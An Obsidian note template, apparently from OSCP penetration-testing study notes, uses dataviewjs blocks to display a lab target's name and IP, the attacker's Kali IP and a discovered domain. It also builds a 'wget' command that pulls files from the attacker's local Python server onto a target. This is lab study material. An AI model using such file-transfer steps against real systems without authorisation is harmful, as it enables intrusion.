[[Active Machine Template]]

| Machine | IP Address | Notes |
| ------- | ---------- | ----- |
|         |            |       |

MACHINE:: apex
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const machine = page?.MACHINE ?? "NO MACHINE FOUND";

const command = `${machine}`;

dv.paragraph("```bash\n" + command + "\n```");
```
IP::   
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = `${ip}`;

dv.paragraph("```bash\n" + command + "\n```");
```
KALI IP::  192.168.45.248
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `${KaliIP}`;

dv.paragraph("```bash\n" + command + "\n```");
```
Discovered Web Domain:: 
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");
const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const command = `http://${discoveredDomain}/`;

dv.paragraph("```bash\n" + command + "\n```");
```
wget from local python server
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `wget http://${KaliIP}:8888/[file]`;

dv.paragraph("```bash\n" + command + "\n```");
```


